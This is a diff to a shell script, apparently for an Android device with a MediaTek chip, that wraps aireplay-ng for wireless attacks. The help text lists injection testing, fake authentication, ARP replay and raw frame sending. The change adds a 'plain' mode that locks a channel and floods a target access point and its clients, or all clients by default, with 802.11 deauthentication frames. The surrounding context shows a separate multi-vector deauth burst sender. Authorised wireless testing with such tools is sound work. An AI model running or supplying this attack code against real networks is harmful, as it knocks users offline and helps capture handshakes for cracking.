@@ -38,7 +38,8 @@ show_help() {
     echo ""
     echo "Modes:"
     echo "  -9, --test                 Test injection capability against AP"
-    echo "  -0, --deauth               Transmit 802.11 Deauth / Disassoc frames"
+    echo "  -0, --deauth               Transmit 802.11 Deauth (Bidirectional multi-vector)"
+    echo "  -p, --plain                Transmit plain AP->Client deauth only (aireplay-ng -0)"
     echo "  -1, --fakeauth             Perform Fake Authentication with AP"
     echo "  -3, --arp                  Perform ARP Request Replay"
     echo "  -r, --raw <hex_bytes>      Send raw custom 802.11 hex frame"
@@ -82,6 +83,10 @@ while [ $# -gt 0 ]; do
             ;;
         -0|--deauth|deauth)
             MODE="deauth"
+            shift
+            ;;
+        -p|--plain|plain)
+            MODE="plain"
             shift
             ;;
         -1|--fakeauth|fakeauth)
@@ -279,6 +284,27 @@ for i in range(count):
 s.close()
 print(f"[+] Optimized bidirectional burst: {tx_sent} frames dispatched ({count} cycles x {tx_sent//count if count else 0} frames/cycle).")
 ' "$MON_DEV" "$TARGET_AP" "$client" "$COUNT"
+        ;;
+    plain)
+        if [ -z "$TARGET_AP" ]; then
+            echo "[-] Error: Target AP BSSID (-a <mac>) is required for plain deauth." >&2
+            exit 1
+        fi
+
+        # Lock channel if specified
+        if [ -n "$CHANNEL" ]; then
+            airmon-mtk channel "$CHANNEL" 20 >/dev/null 2>&1 || wpa_cli -i wlan0 -p /data/vendor/wifi/wpa/sockets driver "MONITOR 1 $CHANNEL 20 0" >/dev/null 2>&1
+        fi
+
+        local client="${TARGET_CLIENT:-ff:ff:ff:ff:ff:ff}"
+        echo "[*] Plain AP->Client Deauth via aireplay-ng..."
+        echo "[*] Target AP:     $TARGET_AP"
+        echo "[*] Target Client: $client"
+        [ -n "$CHANNEL" ] && echo "[*] Target CH:     $CHANNEL"
+
+        CLIENT_ARG=""
+        [ -n "$TARGET_CLIENT" ] && [ "$TARGET_CLIENT" != "ff:ff:ff:ff:ff:ff" ] && CLIENT_ARG="-c $TARGET_CLIENT"
+        "$AIREPLAY_BIN" -0 "$COUNT" -D -a "$TARGET_AP" $CLIENT_ARG "$MON_DEV"
         ;;
     fakeauth)
         if [ -z "$TARGET_AP" ]; then
